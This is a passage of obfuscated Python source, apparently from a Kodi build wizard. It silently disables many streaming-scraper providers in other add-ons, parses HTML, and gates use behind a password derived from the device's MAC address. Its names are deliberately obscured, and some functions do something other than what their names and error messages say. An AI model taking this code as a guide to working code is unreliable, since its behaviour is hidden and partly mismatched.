	OO0O00O00O0OO00OO =(ADDON .getSetting ("rdbuild"))#line:1210
	if OO0O00O00O0OO00OO =='true':#line:1211
		O00OOO0OO0OOOO0OO =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1212
		O00OOO0OO0OOOO0OO .setSetting ('all_t','0')#line:1213
		O00OOO0OO0OOOO0OO .setSetting ('rd_menu_enable','false')#line:1214
		O00OOO0OO0OOOO0OO .setSetting ('magnet_bay','false')#line:1215
		O00OOO0OO0OOOO0OO .setSetting ('magnet_extra','false')#line:1216
		O00OOO0OO0OOOO0OO .setSetting ('rd_only','false')#line:1217
		O00OOO0OO0OOOO0OO .setSetting ('ftp','false')#line:1219
		O00OOO0OO0OOOO0OO .setSetting ('fp','false')#line:1220
		O00OOO0OO0OOOO0OO .setSetting ('filter_fp','false')#line:1221
		O00OOO0OO0OOOO0OO .setSetting ('fp_size_en','false')#line:1222
		O00OOO0OO0OOOO0OO .setSetting ('afdah','false')#line:1223
		O00OOO0OO0OOOO0OO .setSetting ('ap2s','false')#line:1224
		O00OOO0OO0OOOO0OO .setSetting ('cin','false')#line:1225
		O00OOO0OO0OOOO0OO .setSetting ('clv','false')#line:1226
		O00OOO0OO0OOOO0OO .setSetting ('cmv','false')#line:1227
		O00OOO0OO0OOOO0OO .setSetting ('dl20','false')#line:1228
		O00OOO0OO0OOOO0OO .setSetting ('esc','false')#line:1229
		O00OOO0OO0OOOO0OO .setSetting ('extra','false')#line:1230
		O00OOO0OO0OOOO0OO .setSetting ('film','false')#line:1231
		O00OOO0OO0OOOO0OO .setSetting ('fre','false')#line:1232
		O00OOO0OO0OOOO0OO .setSetting ('fxy','false')#line:1233
		O00OOO0OO0OOOO0OO .setSetting ('genv','false')#line:1234
		O00OOO0OO0OOOO0OO .setSetting ('getgo','false')#line:1235
		O00OOO0OO0OOOO0OO .setSetting ('gold','false')#line:1236
		O00OOO0OO0OOOO0OO .setSetting ('gona','false')#line:1237
		O00OOO0OO0OOOO0OO .setSetting ('hdmm','false')#line:1238
		O00OOO0OO0OOOO0OO .setSetting ('hdt','false')#line:1239
		O00OOO0OO0OOOO0OO .setSetting ('icy','false')#line:1240
		O00OOO0OO0OOOO0OO .setSetting ('ind','false')#line:1241
		O00OOO0OO0OOOO0OO .setSetting ('iwi','false')#line:1242
		O00OOO0OO0OOOO0OO .setSetting ('jen_free','false')#line:1243
		O00OOO0OO0OOOO0OO .setSetting ('kiss','false')#line:1244
		O00OOO0OO0OOOO0OO .setSetting ('lavin','false')#line:1245
		O00OOO0OO0OOOO0OO .setSetting ('los','false')#line:1246
		O00OOO0OO0OOOO0OO .setSetting ('m4u','false')#line:1247
		O00OOO0OO0OOOO0OO .setSetting ('mesh','false')#line:1248
		O00OOO0OO0OOOO0OO .setSetting ('mf','false')#line:1249
		O00OOO0OO0OOOO0OO .setSetting ('mkvc','false')#line:1250
		O00OOO0OO0OOOO0OO .setSetting ('mjy','false')#line:1251
		O00OOO0OO0OOOO0OO .setSetting ('hdonline','false')#line:1252
		O00OOO0OO0OOOO0OO .setSetting ('moviex','false')#line:1253
		O00OOO0OO0OOOO0OO .setSetting ('mpr','false')#line:1254
		O00OOO0OO0OOOO0OO .setSetting ('mvg','false')#line:1255
		O00OOO0OO0OOOO0OO .setSetting ('mvl','false')#line:1256
		O00OOO0OO0OOOO0OO .setSetting ('mvs','false')#line:1257
		O00OOO0OO0OOOO0OO .setSetting ('myeg','false')#line:1258
		O00OOO0OO0OOOO0OO .setSetting ('ninja','false')#line:1259
		O00OOO0OO0OOOO0OO .setSetting ('odb','false')#line:1260
		O00OOO0OO0OOOO0OO .setSetting ('ophd','false')#line:1261
		O00OOO0OO0OOOO0OO .setSetting ('pks','false')#line:1262
		O00OOO0OO0OOOO0OO .setSetting ('prf','false')#line:1263
		O00OOO0OO0OOOO0OO .setSetting ('put18','false')#line:1264
		O00OOO0OO0OOOO0OO .setSetting ('req','false')#line:1265
		O00OOO0OO0OOOO0OO .setSetting ('rftv','false')#line:1266
		O00OOO0OO0OOOO0OO .setSetting ('rltv','false')#line:1267
		O00OOO0OO0OOOO0OO .setSetting ('sc','false')#line:1268
		O00OOO0OO0OOOO0OO .setSetting ('seehd','false')#line:1269
		O00OOO0OO0OOOO0OO .setSetting ('showbox','false')#line:1270
		O00OOO0OO0OOOO0OO .setSetting ('shuid','false')#line:1271
		O00OOO0OO0OOOO0OO .setSetting ('sil_gh','false')#line:1272
		O00OOO0OO0OOOO0OO .setSetting ('spv','false')#line:1273
		O00OOO0OO0OOOO0OO .setSetting ('subs','false')#line:1274
		O00OOO0OO0OOOO0OO .setSetting ('tvs','false')#line:1275
		O00OOO0OO0OOOO0OO .setSetting ('tw','false')#line:1276
		O00OOO0OO0OOOO0OO .setSetting ('upto','false')#line:1277
		O00OOO0OO0OOOO0OO .setSetting ('vel','false')#line:1278
		O00OOO0OO0OOOO0OO .setSetting ('vex','false')#line:1279
		O00OOO0OO0OOOO0OO .setSetting ('vidc','false')#line:1280
		O00OOO0OO0OOOO0OO .setSetting ('w4hd','false')#line:1281
		O00OOO0OO0OOOO0OO .setSetting ('wav','false')#line:1282
		O00OOO0OO0OOOO0OO .setSetting ('wf','false')#line:1283
		O00OOO0OO0OOOO0OO .setSetting ('wse','false')#line:1284
		O00OOO0OO0OOOO0OO .setSetting ('wss','false')#line:1285
		O00OOO0OO0OOOO0OO .setSetting ('wsse','false')#line:1286
		O00OOO0OO0OOOO0OO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1287
		O00OOO0OO0OOOO0OO .setSetting ('debrid.only','true')#line:1288
		O00OOO0OO0OOOO0OO .setSetting ('hosts.captcha','false')#line:1289
		O00OOO0OO0OOOO0OO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1290
		O00OOO0OO0OOOO0OO .setSetting ('provider.123moviehd','false')#line:1291
		O00OOO0OO0OOOO0OO .setSetting ('provider.300mbdownload','false')#line:1292
		O00OOO0OO0OOOO0OO .setSetting ('provider.alltube','false')#line:1293
		O00OOO0OO0OOOO0OO .setSetting ('provider.allucde','false')#line:1294
		O00OOO0OO0OOOO0OO .setSetting ('provider.animebase','false')#line:1295
		O00OOO0OO0OOOO0OO .setSetting ('provider.animeloads','false')#line:1296
		O00OOO0OO0OOOO0OO .setSetting ('provider.animetoon','false')#line:1297
		O00OOO0OO0OOOO0OO .setSetting ('provider.bnwmovies','false')#line:1298
		O00OOO0OO0OOOO0OO .setSetting ('provider.boxfilm','false')#line:1299
		O00OOO0OO0OOOO0OO .setSetting ('provider.bs','false')#line:1300
		O00OOO0OO0OOOO0OO .setSetting ('provider.cartoonhd','false')#line:1301
		O00OOO0OO0OOOO0OO .setSetting ('provider.cdahd','false')#line:1302
		O00OOO0OO0OOOO0OO .setSetting ('provider.cdax','false')#line:1303
		O00OOO0OO0OOOO0OO .setSetting ('provider.cine','false')#line:1304
		O00OOO0OO0OOOO0OO .setSetting ('provider.cinenator','false')#line:1305
		O00OOO0OO0OOOO0OO .setSetting ('provider.cmovieshdbz','false')#line:1306
		O00OOO0OO0OOOO0OO .setSetting ('provider.coolmoviezone','false')#line:1307
		O00OOO0OO0OOOO0OO .setSetting ('provider.ddl','false')#line:1308
		O00OOO0OO0OOOO0OO .setSetting ('provider.deepmovie','false')#line:1309
		O00OOO0OO0OOOO0OO .setSetting ('provider.ekinomaniak','false')#line:1310
		O00OOO0OO0OOOO0OO .setSetting ('provider.ekinotv','false')#line:1311
		O00OOO0OO0OOOO0OO .setSetting ('provider.filiser','false')#line:1312
		O00OOO0OO0OOOO0OO .setSetting ('provider.filmpalast','false')#line:1313
		O00OOO0OO0OOOO0OO .setSetting ('provider.filmwebbooster','false')#line:1314
		O00OOO0OO0OOOO0OO .setSetting ('provider.filmxy','false')#line:1315
		O00OOO0OO0OOOO0OO .setSetting ('provider.fmovies','false')#line:1316
		O00OOO0OO0OOOO0OO .setSetting ('provider.foxx','false')#line:1317
		O00OOO0OO0OOOO0OO .setSetting ('provider.freefmovies','false')#line:1318
		O00OOO0OO0OOOO0OO .setSetting ('provider.freeputlocker','false')#line:1319
		O00OOO0OO0OOOO0OO .setSetting ('provider.furk','false')#line:1320
		O00OOO0OO0OOOO0OO .setSetting ('provider.gamatotv','false')#line:1321
		O00OOO0OO0OOOO0OO .setSetting ('provider.gogoanime','false')#line:1322
		O00OOO0OO0OOOO0OO .setSetting ('provider.gowatchseries','false')#line:1323
		O00OOO0OO0OOOO0OO .setSetting ('provider.hackimdb','false')#line:1324
		O00OOO0OO0OOOO0OO .setSetting ('provider.hdfilme','false')#line:1325
		O00OOO0OO0OOOO0OO .setSetting ('provider.hdmto','false')#line:1326
		O00OOO0OO0OOOO0OO .setSetting ('provider.hdpopcorns','false')#line:1327
		O00OOO0OO0OOOO0OO .setSetting ('provider.hdstreams','false')#line:1328
		O00OOO0OO0OOOO0OO .setSetting ('provider.horrorkino','false')#line:1330
		O00OOO0OO0OOOO0OO .setSetting ('provider.iitv','false')#line:1331
		O00OOO0OO0OOOO0OO .setSetting ('provider.iload','false')#line:1332
		O00OOO0OO0OOOO0OO .setSetting ('provider.iwaatch','false')#line:1333
		O00OOO0OO0OOOO0OO .setSetting ('provider.kinodogs','false')#line:1334
		O00OOO0OO0OOOO0OO .setSetting ('provider.kinoking','false')#line:1335
		O00OOO0OO0OOOO0OO .setSetting ('provider.kinow','false')#line:1336
		O00OOO0OO0OOOO0OO .setSetting ('provider.kinox','false')#line:1337
		O00OOO0OO0OOOO0OO .setSetting ('provider.lichtspielhaus','false')#line:1338
		O00OOO0OO0OOOO0OO .setSetting ('provider.liomenoi','false')#line:1339
		O00OOO0OO0OOOO0OO .setSetting ('provider.magnetdl','false')#line:1342
		O00OOO0OO0OOOO0OO .setSetting ('provider.megapelistv','false')#line:1343
		O00OOO0OO0OOOO0OO .setSetting ('provider.movie2k-ac','false')#line:1344
		O00OOO0OO0OOOO0OO .setSetting ('provider.movie2k-ag','false')#line:1345
		O00OOO0OO0OOOO0OO .setSetting ('provider.movie2z','false')#line:1346
		O00OOO0OO0OOOO0OO .setSetting ('provider.movie4k','false')#line:1347
		O00OOO0OO0OOOO0OO .setSetting ('provider.movie4kis','false')#line:1348
		O00OOO0OO0OOOO0OO .setSetting ('provider.movieneo','false')#line:1349
		O00OOO0OO0OOOO0OO .setSetting ('provider.moviesever','false')#line:1350
		O00OOO0OO0OOOO0OO .setSetting ('provider.movietown','false')#line:1351
		O00OOO0OO0OOOO0OO .setSetting ('provider.mvrls','false')#line:1353
		O00OOO0OO0OOOO0OO .setSetting ('provider.netzkino','false')#line:1354
		O00OOO0OO0OOOO0OO .setSetting ('provider.odb','false')#line:1355
		O00OOO0OO0OOOO0OO .setSetting ('provider.openkatalog','false')#line:1356
		O00OOO0OO0OOOO0OO .setSetting ('provider.ororo','false')#line:1357
		O00OOO0OO0OOOO0OO .setSetting ('provider.paczamy','false')#line:1358
		O00OOO0OO0OOOO0OO .setSetting ('provider.peliculasdk','false')#line:1359
		O00OOO0OO0OOOO0OO .setSetting ('provider.pelisplustv','false')#line:1360
		O00OOO0OO0OOOO0OO .setSetting ('provider.pepecine','false')#line:1361
		O00OOO0OO0OOOO0OO .setSetting ('provider.primewire','false')#line:1362
		O00OOO0OO0OOOO0OO .setSetting ('provider.projectfreetv','false')#line:1363
		O00OOO0OO0OOOO0OO .setSetting ('provider.proxer','false')#line:1364
		O00OOO0OO0OOOO0OO .setSetting ('provider.pureanime','false')#line:1365
		O00OOO0OO0OOOO0OO .setSetting ('provider.putlocker','false')#line:1366
		O00OOO0OO0OOOO0OO .setSetting ('provider.putlockerfree','false')#line:1367
		O00OOO0OO0OOOO0OO .setSetting ('provider.reddit','false')#line:1368
		O00OOO0OO0OOOO0OO .setSetting ('provider.cartoonwire','false')#line:1369
		O00OOO0OO0OOOO0OO .setSetting ('provider.seehd','false')#line:1370
		O00OOO0OO0OOOO0OO .setSetting ('provider.segos','false')#line:1371
		O00OOO0OO0OOOO0OO .setSetting ('provider.serienstream','false')#line:1372
		O00OOO0OO0OOOO0OO .setSetting ('provider.series9','false')#line:1373
		O00OOO0OO0OOOO0OO .setSetting ('provider.seriesever','false')#line:1374
		O00OOO0OO0OOOO0OO .setSetting ('provider.seriesonline','false')#line:1375
		O00OOO0OO0OOOO0OO .setSetting ('provider.seriespapaya','false')#line:1376
		O00OOO0OO0OOOO0OO .setSetting ('provider.sezonlukdizi','false')#line:1377
		O00OOO0OO0OOOO0OO .setSetting ('provider.solarmovie','false')#line:1378
		O00OOO0OO0OOOO0OO .setSetting ('provider.solarmoviez','false')#line:1379
		O00OOO0OO0OOOO0OO .setSetting ('provider.stream-to','false')#line:1380
		O00OOO0OO0OOOO0OO .setSetting ('provider.streamdream','false')#line:1381
		O00OOO0OO0OOOO0OO .setSetting ('provider.streamflix','false')#line:1382
		O00OOO0OO0OOOO0OO .setSetting ('provider.streamit','false')#line:1383
		O00OOO0OO0OOOO0OO .setSetting ('provider.swatchseries','false')#line:1384
		O00OOO0OO0OOOO0OO .setSetting ('provider.szukajkatv','false')#line:1385
		O00OOO0OO0OOOO0OO .setSetting ('provider.tainiesonline','false')#line:1386
		O00OOO0OO0OOOO0OO .setSetting ('provider.tainiomania','false')#line:1387
		O00OOO0OO0OOOO0OO .setSetting ('provider.tata','false')#line:1390
		O00OOO0OO0OOOO0OO .setSetting ('provider.trt','false')#line:1391
		O00OOO0OO0OOOO0OO .setSetting ('provider.tvbox','false')#line:1392
		O00OOO0OO0OOOO0OO .setSetting ('provider.ultrahd','false')#line:1393
		O00OOO0OO0OOOO0OO .setSetting ('provider.video4k','false')#line:1394
		O00OOO0OO0OOOO0OO .setSetting ('provider.vidics','false')#line:1395
		O00OOO0OO0OOOO0OO .setSetting ('provider.view4u','false')#line:1396
		O00OOO0OO0OOOO0OO .setSetting ('provider.watchseries','false')#line:1397
		O00OOO0OO0OOOO0OO .setSetting ('provider.xrysoi','false')#line:1398
		O00OOO0OO0OOOO0OO .setSetting ('provider.library','false')#line:1399
def fixfont ():#line:1402
	O0000O00OOOO0O0OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1403
	O00OO0O0O0O0O0O00 =json .loads (O0000O00OOOO0O0OO );#line:1405
	OO0O0O0000O00OO0O =O00OO0O0O0O0O0O00 ["result"]["settings"]#line:1406
	OO0O00OO00000OO00 =[O00O000O00O00O000 for O00O000O00O00O000 in OO0O0O0000O00OO0O if O00O000O00O00O000 ["id"]=="audiooutput.audiodevice"][0 ]#line:1408
	O00000O00OO0OO000 =OO0O00OO00000OO00 ["options"];#line:1409
	O0000000000O000O0 =OO0O00OO00000OO00 ["value"];#line:1410
	O00O00000000O00O0 =[OOOO0OOOOOOOO000O for (OOOO0OOOOOOOO000O ,O0O00OOOOO0O0OOOO )in enumerate (O00000O00OO0OO000 )if O0O00OOOOO0O0OOOO ["value"]==O0000000000O000O0 ][0 ];#line:1412
	O0O0OOOOO00O0OO00 =(O00O00000000O00O0 +1 )%len (O00000O00OO0OO000 )#line:1414
	O0O00O0OOO00OOOO0 =O00000O00OO0OO000 [O0O0OOOOO00O0OO00 ]["value"]#line:1416
	OOO000OO0O00OO00O =O00000O00OO0OO000 [O0O0OOOOO00O0OO00 ]["label"]#line:1417
	O0O0O0O000O0O0O00 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1419
	try :#line:1421
		O00O0O0O000O00O0O =json .loads (O0O0O0O000O0O0O00 );#line:1422
		if O00O0O0O000O00O0O ["result"]!=True :#line:1424
			raise Exception #line:1425
	except :#line:1426
		sys .stderr .write ("Error switching audio output device")#line:1427
		raise Exception #line:1428
def parseDOM2 (O0O000OOO0O00OOO0 ,name =u"",attrs ={},ret =False ):#line:1429
	if isinstance (O0O000OOO0O00OOO0 ,str ):#line:1432
		try :#line:1433
			O0O000OOO0O00OOO0 =[O0O000OOO0O00OOO0 .decode ("utf-8")]#line:1434
		except :#line:1435
			O0O000OOO0O00OOO0 =[O0O000OOO0O00OOO0 ]#line:1436
	elif isinstance (O0O000OOO0O00OOO0 ,unicode ):#line:1437
		O0O000OOO0O00OOO0 =[O0O000OOO0O00OOO0 ]#line:1438
	elif not isinstance (O0O000OOO0O00OOO0 ,list ):#line:1439
		return u""#line:1440
	if not name .strip ():#line:1442
		return u""#line:1443
	O00OOOOO0O0OO00O0 =[]#line:1445
	for OO00OOO0O0OO00OO0 in O0O000OOO0O00OOO0 :#line:1446
		O0O000OOOOOO0OO0O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO00OOO0O0OO00OO0 )#line:1447
		for OOO00000OOO00OO0O in O0O000OOOOOO0OO0O :#line:1448
			OO00OOO0O0OO00OO0 =OO00OOO0O0OO00OO0 .replace (OOO00000OOO00OO0O ,OOO00000OOO00OO0O .replace ("\n"," "))#line:1449
		O00OOOO00O0OO00OO =[]#line:1451
		for O0O0O0O00OOO000O0 in attrs :#line:1452
			OOO00OO0000OO0O0O =re .compile ('(<'+name +'[^>]*?(?:'+O0O0O0O00OOO000O0 +'=[\'"]'+attrs [O0O0O0O00OOO000O0 ]+'[\'"].*?>))',re .M |re .S ).findall (OO00OOO0O0OO00OO0 )#line:1453
			if len (OOO00OO0000OO0O0O )==0 and attrs [O0O0O0O00OOO000O0 ].find (" ")==-1 :#line:1454
				OOO00OO0000OO0O0O =re .compile ('(<'+name +'[^>]*?(?:'+O0O0O0O00OOO000O0 +'='+attrs [O0O0O0O00OOO000O0 ]+'.*?>))',re .M |re .S ).findall (OO00OOO0O0OO00OO0 )#line:1455
			if len (O00OOOO00O0OO00OO )==0 :#line:1457
				O00OOOO00O0OO00OO =OOO00OO0000OO0O0O #line:1458
				OOO00OO0000OO0O0O =[]#line:1459
			else :#line:1460
				OOOOOOOOOO0OO0O00 =range (len (O00OOOO00O0OO00OO ))#line:1461
				OOOOOOOOOO0OO0O00 .reverse ()#line:1462
				for O0O000OO0OOOO0OO0 in OOOOOOOOOO0OO0O00 :#line:1463
					if not O00OOOO00O0OO00OO [O0O000OO0OOOO0OO0 ]in OOO00OO0000OO0O0O :#line:1464
						del (O00OOOO00O0OO00OO [O0O000OO0OOOO0OO0 ])#line:1465
		if len (O00OOOO00O0OO00OO )==0 and attrs =={}:#line:1467
			O00OOOO00O0OO00OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO00OOO0O0OO00OO0 )#line:1468
			if len (O00OOOO00O0OO00OO )==0 :#line:1469
				O00OOOO00O0OO00OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO00OOO0O0OO00OO0 )#line:1470
		if isinstance (ret ,str ):#line:1472
			OOO00OO0000OO0O0O =[]#line:1473
			for OOO00000OOO00OO0O in O00OOOO00O0OO00OO :#line:1474
				O0O000O000O0O00O0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOO00000OOO00OO0O )#line:1475
				if len (O0O000O000O0O00O0 )==0 :#line:1476
					O0O000O000O0O00O0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOO00000OOO00OO0O )#line:1477
				for OOO000OOO000OOOO0 in O0O000O000O0O00O0 :#line:1478
					O0OO000OO0O00OOO0 =OOO000OOO000OOOO0 [0 ]#line:1479
					if O0OO000OO0O00OOO0 in "'\"":#line:1480
						if OOO000OOO000OOOO0 .find ('='+O0OO000OO0O00OOO0 ,OOO000OOO000OOOO0 .find (O0OO000OO0O00OOO0 ,1 ))>-1 :#line:1481
							OOO000OOO000OOOO0 =OOO000OOO000OOOO0 [:OOO000OOO000OOOO0 .find ('='+O0OO000OO0O00OOO0 ,OOO000OOO000OOOO0 .find (O0OO000OO0O00OOO0 ,1 ))]#line:1482
						if OOO000OOO000OOOO0 .rfind (O0OO000OO0O00OOO0 ,1 )>-1 :#line:1484
							OOO000OOO000OOOO0 =OOO000OOO000OOOO0 [1 :OOO000OOO000OOOO0 .rfind (O0OO000OO0O00OOO0 )]#line:1485
					else :#line:1486
						if OOO000OOO000OOOO0 .find (" ")>0 :#line:1487
							OOO000OOO000OOOO0 =OOO000OOO000OOOO0 [:OOO000OOO000OOOO0 .find (" ")]#line:1488
						elif OOO000OOO000OOOO0 .find ("/")>0 :#line:1489
							OOO000OOO000OOOO0 =OOO000OOO000OOOO0 [:OOO000OOO000OOOO0 .find ("/")]#line:1490
						elif OOO000OOO000OOOO0 .find (">")>0 :#line:1491
							OOO000OOO000OOOO0 =OOO000OOO000OOOO0 [:OOO000OOO000OOOO0 .find (">")]#line:1492
					OOO00OO0000OO0O0O .append (OOO000OOO000OOOO0 .strip ())#line:1494
			O00OOOO00O0OO00OO =OOO00OO0000OO0O0O #line:1495
		else :#line:1496
			OOO00OO0000OO0O0O =[]#line:1497
			for OOO00000OOO00OO0O in O00OOOO00O0OO00OO :#line:1498
				O000OOO0OOO0O00O0 =u"</"+name #line:1499
				OO0OO0O00OOO00O00 =OO00OOO0O0OO00OO0 .find (OOO00000OOO00OO0O )#line:1501
				O0OOOOOO0O0OO000O =OO00OOO0O0OO00OO0 .find (O000OOO0OOO0O00O0 ,OO0OO0O00OOO00O00 )#line:1502
				O0O0O0OO0000OO00O =OO00OOO0O0OO00OO0 .find ("<"+name ,OO0OO0O00OOO00O00 +1 )#line:1503
				while O0O0O0OO0000OO00O <O0OOOOOO0O0OO000O and O0O0O0OO0000OO00O !=-1 :#line:1505
					OOO0O0O00OOOOOO00 =OO00OOO0O0OO00OO0 .find (O000OOO0OOO0O00O0 ,O0OOOOOO0O0OO000O +len (O000OOO0OOO0O00O0 ))#line:1506
					if OOO0O0O00OOOOOO00 !=-1 :#line:1507
						O0OOOOOO0O0OO000O =OOO0O0O00OOOOOO00 #line:1508
					O0O0O0OO0000OO00O =OO00OOO0O0OO00OO0 .find ("<"+name ,O0O0O0OO0000OO00O +1 )#line:1509
				if OO0OO0O00OOO00O00 ==-1 and O0OOOOOO0O0OO000O ==-1 :#line:1511
					O0OOOOO0OOOOOO0O0 =u""#line:1512
				elif OO0OO0O00OOO00O00 >-1 and O0OOOOOO0O0OO000O >-1 :#line:1513
					O0OOOOO0OOOOOO0O0 =OO00OOO0O0OO00OO0 [OO0OO0O00OOO00O00 +len (OOO00000OOO00OO0O ):O0OOOOOO0O0OO000O ]#line:1514
				elif O0OOOOOO0O0OO000O >-1 :#line:1515
					O0OOOOO0OOOOOO0O0 =OO00OOO0O0OO00OO0 [:O0OOOOOO0O0OO000O ]#line:1516
				elif OO0OO0O00OOO00O00 >-1 :#line:1517
					O0OOOOO0OOOOOO0O0 =OO00OOO0O0OO00OO0 [OO0OO0O00OOO00O00 +len (OOO00000OOO00OO0O ):]#line:1518
				if ret :#line:1520
					O000OOO0OOO0O00O0 =OO00OOO0O0OO00OO0 [O0OOOOOO0O0OO000O :OO00OOO0O0OO00OO0 .find (">",OO00OOO0O0OO00OO0 .find (O000OOO0OOO0O00O0 ))+1 ]#line:1521
					O0OOOOO0OOOOOO0O0 =OOO00000OOO00OO0O +O0OOOOO0OOOOOO0O0 +O000OOO0OOO0O00O0 #line:1522
				OO00OOO0O0OO00OO0 =OO00OOO0O0OO00OO0 [OO00OOO0O0OO00OO0 .find (O0OOOOO0OOOOOO0O0 ,OO00OOO0O0OO00OO0 .find (OOO00000OOO00OO0O ))+len (O0OOOOO0OOOOOO0O0 ):]#line:1524
				OOO00OO0000OO0O0O .append (O0OOOOO0OOOOOO0O0 )#line:1525
			O00OOOO00O0OO00OO =OOO00OO0000OO0O0O #line:1526
		O00OOOOO0O0OO00O0 +=O00OOOO00O0OO00OO #line:1527
	return O00OOOOO0O0OO00O0 #line:1529
def addItem (O000O00OOOOOOO0OO ,O0O0O0O0OOOO0OOO0 ,O00OOOOO00OOOO00O ,OOOOOO00000O0000O ,OO0OO0O0O00OO00OO ,description =None ):#line:1531
	if description ==None :description =''#line:1532
	description ='[COLOR white]'+description +'[/COLOR]'#line:1533
	O00O0OO00O0O0OOOO =sys .argv [0 ]+"?url="+urllib .quote_plus (O0O0O0O0OOOO0OOO0 )+"&mode="+str (O00OOOOO00OOOO00O )+"&name="+urllib .quote_plus (O000O00OOOOOOO0OO )+"&iconimage="+urllib .quote_plus (OOOOOO00000O0000O )+"&fanart="+urllib .quote_plus (OO0OO0O0O00OO00OO )#line:1534
	O0O0O0OOO0O00OO0O =True #line:1535
	OO00000OO0O0OO00O =xbmcgui .ListItem (O000O00OOOOOOO0OO ,iconImage =OOOOOO00000O0000O ,thumbnailImage =OOOOOO00000O0000O )#line:1536
	OO00000OO0O0OO00O .setInfo (type ="Video",infoLabels ={"Title":O000O00OOOOOOO0OO ,"Plot":description })#line:1537
	OO00000OO0O0OO00O .setProperty ("fanart_Image",OO0OO0O0O00OO00OO )#line:1538
	OO00000OO0O0OO00O .setProperty ("icon_Image",OOOOOO00000O0000O )#line:1539
	O0O0O0OOO0O00OO0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00O0OO00O0O0OOOO ,listitem =OO00000OO0O0OO00O ,isFolder =False )#line:1540
	return O0O0O0OOO0O00OO0O #line:1541
def get_params ():#line:1543
		O0OO000OOO0O00OO0 =[]#line:1544
		OO0O0OOOOO000O000 =sys .argv [2 ]#line:1545
		if len (OO0O0OOOOO000O000 )>=2 :#line:1546
				OO00OO0O0OOOOOO00 =sys .argv [2 ]#line:1547
				O0OOOO00OOOO00000 =OO00OO0O0OOOOOO00 .replace ('?','')#line:1548
				if (OO00OO0O0OOOOOO00 [len (OO00OO0O0OOOOOO00 )-1 ]=='/'):#line:1549
						OO00OO0O0OOOOOO00 =OO00OO0O0OOOOOO00 [0 :len (OO00OO0O0OOOOOO00 )-2 ]#line:1550
				OOO00000OO0OOOO00 =O0OOOO00OOOO00000 .split ('&')#line:1551
				O0OO000OOO0O00OO0 ={}#line:1552
				for O0O00OOO0000O0O0O in range (len (OOO00000OO0OOOO00 )):#line:1553
						OOOOOOO0O0OOO0O00 ={}#line:1554
						OOOOOOO0O0OOO0O00 =OOO00000OO0OOOO00 [O0O00OOO0000O0O0O ].split ('=')#line:1555
						if (len (OOOOOOO0O0OOO0O00 ))==2 :#line:1556
								O0OO000OOO0O00OO0 [OOOOOOO0O0OOO0O00 [0 ]]=OOOOOOO0O0OOO0O00 [1 ]#line:1557
		return O0OO000OOO0O00OO0 #line:1559
def decode (O0OO00000OOOO0O00 ,OOO000OO0OOO000O0 ):#line:1564
    import base64 #line:1565
    O0000O0O0000OOOO0 =[]#line:1566
    if (len (O0OO00000OOOO0O00 ))!=4 :#line:1568
     return 10 #line:1569
    OOO000OO0OOO000O0 =base64 .urlsafe_b64decode (OOO000OO0OOO000O0 )#line:1570
    for OOOO00O00OOO0000O in range (len (OOO000OO0OOO000O0 )):#line:1572
        O0000OO0O0OOOOO0O =O0OO00000OOOO0O00 [OOOO00O00OOO0000O %len (O0OO00000OOOO0O00 )]#line:1573
        OOOOO00OO0O00O00O =chr ((256 +ord (OOO000OO0OOO000O0 [OOOO00O00OOO0000O ])-ord (O0000OO0O0OOOOO0O ))%256 )#line:1574
        O0000O0O0000OOOO0 .append (OOOOO00OO0O00O00O )#line:1575
    return "".join (O0000O0O0000OOOO0 )#line:1576
def tmdb_list (OO0O0OO0O0O000000 ):#line:1577
    OOO0000OOOOOOOOOO =decode ("7643",OO0O0OO0O0O000000 )#line:1580
    return int (OOO0000OOOOOOOOOO )#line:1583
def u_list (OO0OO0O0OO00OO000 ):#line:1584
    from math import sqrt #line:1586
    O000OO00O000OO00O =tmdb_list (TMDB_NEW_API )#line:1587
    O00OO0O000OO0OOOO =str ((getHwAddr ('eth0'))*O000OO00O000OO00O )#line:1589
    O000O0OO00OOOOO00 =int (O00OO0O000OO0OOOO [1 ]+O00OO0O000OO0OOOO [2 ]+O00OO0O000OO0OOOO [5 ]+O00OO0O000OO0OOOO [7 ])#line:1590
    O00O0OOO0OOOO0O0O =(ADDON .getSetting ("pass"))#line:1592
    O0O0000O0O00O000O =(str (round (sqrt ((O000O0OO00OOOOO00 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1597
    if '.'in O0O0000O0O00O000O :#line:1598
     O0O0000O0O00O000O =(str (round (sqrt ((O000O0OO00OOOOO00 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1599
    if O00O0OOO0OOOO0O0O ==O0O0000O0O00O000O :#line:1601
      OOO00O0OOOOO00O00 =OO0OO0O0OO00OO000 #line:1603
    else :#line:1605
       if STARTP2 ()and STARTP ()=='ok':#line:1606
         return OO0OO0O0OO00OO000 #line:1609
       OOO00O0OOOOO00O00 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1610
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1611
       sys .exit ()#line:1612
    return OOO00O0OOOOO00O00 #line:1613
def disply_hwr ():#line:1615
   try :#line:1616
    OO000OOO0OO0O0000 =tmdb_list (TMDB_NEW_API )#line:1617
    O0OOOO0O0000O0O00 =str ((getHwAddr ('eth0'))*OO000OOO0OO0O0000 )#line:1618
    O000OOO0O00000O00 =(O0OOOO0O0000O0O00 [1 ]+O0OOOO0O0000O0O00 [2 ]+O0OOOO0O0000O0O00 [5 ]+O0OOOO0O0000O0O00 [7 ])#line:1625
    O00OO0000O000OO0O =(ADDON .getSetting ("action"))#line:1626
    wiz .setS ('action',str (O000OOO0O00000O00 ))#line:1628
   except :pass #line:1629
def disply_hwr2 ():#line:1630
   try :#line:1631
    O000OO000OOOO0OO0 =tmdb_list (TMDB_NEW_API )#line:1632
